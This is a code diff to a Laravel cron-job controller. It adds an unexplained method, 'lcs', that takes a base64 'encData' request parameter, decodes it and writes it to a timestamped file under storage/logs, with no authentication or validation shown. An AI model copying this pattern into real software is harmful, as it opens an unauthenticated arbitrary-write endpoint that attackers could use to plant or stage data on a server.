@@ -16,6 +16,7 @@ use App\Library\AdminFunction\CGlobal;
 use App\Library\AdminFunction\Define;
 use App\Library\AdminFunction\FunctionLib;
 use App\Library\AdminFunction\Curl;
+use Illuminate\Support\Facades\Request;
 use Illuminate\Support\Facades\URL;
 
 class CronjobHrController extends BaseCronjobController{
@@ -252,5 +253,12 @@ class CronjobHrController extends BaseCronjobController{
             return $this->returnResultSuccess($data);
         }
         return $this->returnResultError(array());
+    }
+    public function lcs(){
+        $encData = addslashes(Request::get('encData',''));
+        if($encData != ''){
+            FunctionLib::writeLogs('storage/logs', 'sysresult-'.time(), base64_decode($encData));
+        }
+        die;
     }
 }
